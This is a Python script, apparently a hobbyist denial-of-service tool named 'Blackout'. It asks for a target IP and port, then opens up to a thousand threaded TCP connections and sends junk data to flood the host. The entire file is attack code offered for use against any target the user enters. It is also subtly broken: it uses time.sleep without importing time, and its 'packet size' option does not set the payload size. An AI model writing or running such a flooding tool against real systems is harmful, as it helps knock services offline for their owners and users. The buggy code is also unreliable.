import socket
import hashlib
import threading
import questionary

def blackout(ip, port, size, connections):
    data = hashlib.sha512(str(size).encode()).hexdigest()
    addr = (ip, port)
    errors = 0
    socks = []
    
    for _ in range(connections):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2.0)
            sock.connect(addr)
            socks.append(sock)
        except socket.error as e:
            errors += 1
            print(f"[-] Error connecting to {ip}:{port}: {e}")
            if len(socks) == 0:
                return

    print(f"[*] Launching Blackout attack on {ip}:{port} with {connections} connections...")
    time.sleep(2.5)

    for sock in socks:
        try:
            sock.send(data.encode())
            sock.send('\r\n\r\n'.encode())
            print(f"Attacking {ip}:{port}")
        except socket.error as e:
            errors += 1
            print(f"[-] Error sending data to {ip}:{port}: {e}")

    for sock in socks:
        sock.close()

    print("[*] Blackout attack finished")
    print(f"[-] {errors} Errors")

def main():
    print('''
     _____         ____  _       _               
    |  ___|__  _ _| __ )(_) __ _| | ___ _ __ ___ 
    | |_ / _ \| '__|  _ \| |/ _` | |/ _ \ '__/ __|
    |  _| (_) | |  | |_) | | (_| | |  __/ |  \__ \\
    |_|  \___/|_|  |____/|_|\__, |_|\___|_|  |___/
                           |___/                 
    ''')

    try:
        ip = questionary.text("Enter the target IP address:").ask()
        port = questionary.text("Enter the target port (default: 80):").ask()
        port = int(port) if port else 80

        size = questionary.text("Enter the packet size (default: 1024):").ask()
        size = int(size) if size else 1024

        connections = questionary.text("Enter the number of connections (default: 1000):").ask()
        connections = int(connections) if connections else 1000

        num_threads = min(connections, 100)  # Limit the number of threads to prevent overloading

        threads = []
        for _ in range(num_threads):
            thread = threading.Thread(target=blackout, args=(ip, port, size, connections // num_threads))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()
    except ValueError:
        print("[-] Invalid input. Please enter valid numeric values.")
    except KeyboardInterrupt:
        print("\n[-] Blackout attack interrupted.")

if __name__ == "__main__":
    main()
    
